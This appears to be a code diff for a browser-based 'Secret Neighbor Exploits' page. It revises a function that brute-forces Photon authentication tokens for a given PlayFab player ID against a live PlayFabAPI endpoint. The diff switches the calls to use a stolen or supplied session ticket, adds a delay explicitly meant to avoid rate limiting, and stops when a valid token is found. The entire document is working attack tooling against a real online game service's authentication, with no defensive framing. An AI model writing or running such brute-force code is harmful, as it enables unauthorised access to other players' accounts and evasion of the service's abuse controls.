@@ -1492,24 +1492,26 @@
       }
     }
 
-   
-
-function generateRandomToken() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split(''); // Precompute character array
-const charsLength = chars.length;
-
-  const tokenLength = 50;
-  const randomBytes = crypto.getRandomValues(new Uint8Array(tokenLength));
-  return Array.from(randomBytes, byte => chars[byte % charsLength]).join('');
+    function generateRandomToken() {
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-';
+  const tokenLength = 36; // Standard UUID-like length for Photon tokens
+  let token = '';
+  for (let i = 0; i < tokenLength; i++) {
+    token += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return token;
 }
 
-async function checkToken(username, token) {
+async function checkToken(playFabId, token) {
   try {
-    const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
+    const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
       method: 'GET',
-      headers: { 'Content-Type': 'application/json' }
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Authorization': sessionTicket
+      }
     });
-    return { token, result: await res.json() };
+    return { token, result: await response.json() };
   } catch (error) {
     return { token, error: error.message };
   }
@@ -1518,33 +1520,40 @@ async function checkToken(username, token) {
 async function startBruteforce() {
   if (bruteforceRunning) return;
 
-  const username = document.getElementById("playFabUsername").value.trim();
+  const playFabId = document.getElementById("playFabUsername").value.trim();
   const output = document.getElementById("bruteforceOutput");
 
-  if (!username) {
+  if (!playFabId) {
     output.textContent = "Please enter a PlayFab ID.";
     return;
   }
 
+  if (!sessionTicket) {
+    output.textContent = "Please set your SessionTicket first.";
+    return;
+  }
+
   bruteforceRunning = true;
-  output.textContent = "Starting bruteforce...\n";
+  output.textContent = "Starting Photon token bruteforce...\n";
 
   async function tryTokenBatch() {
     if (!bruteforceRunning) return;
 
-    const batchSize = 5; // Minimal batch size for speed without overloading
+    const batchSize = 5;
     const tokens = Array.from({ length: batchSize }, generateRandomToken);
-    const results = await Promise.all(tokens.map(token => checkToken(username, token)));
+    const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
 
     let foundValid = false;
     const outputBuffer = [];
 
     for (const { token, result, error } of results) {
       if (error) {
-        outputBuffer.push(`Error for ${token}: ${error}`);
+        outputBuffer.push(`Error for token ${token}: ${error}`);
       } else if (result.resultCode === 1) {
         outputBuffer.push(`✅ Valid token found: ${token}`);
         foundValid = true;
+      } else {
+        outputBuffer.push(`❌ Invalid token: ${token}`);
       }
     }
 
@@ -1554,7 +1563,7 @@ async function startBruteforce() {
     }
 
     if (!foundValid && bruteforceRunning) {
-      requestAnimationFrame(tryTokenBatch); // Use requestAnimationFrame for smoother scheduling
+      setTimeout(tryTokenBatch, 1000); // Delay to prevent rate limiting
     } else if (foundValid) {
       stopBruteforce();
     }
@@ -1562,6 +1571,7 @@ async function startBruteforce() {
 
   tryTokenBatch().catch(error => {
     output.textContent += `Batch error: ${error.message}\n`;
+    output.scrollTop = output.scrollHeight;
     stopBruteforce();
   });
 }
@@ -1569,9 +1579,10 @@ async function startBruteforce() {
 function stopBruteforce() {
   bruteforceRunning = false;
   const output = document.getElementById("bruteforceOutput");
-  output.textContent += "Bruteforce stopped.\n";
+  output.textContent += "Photon token bruteforce stopped.\n";
   output.scrollTop = output.scrollHeight;
 }
+
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
       const savedTicket = localStorage.getItem('sessionTicket');
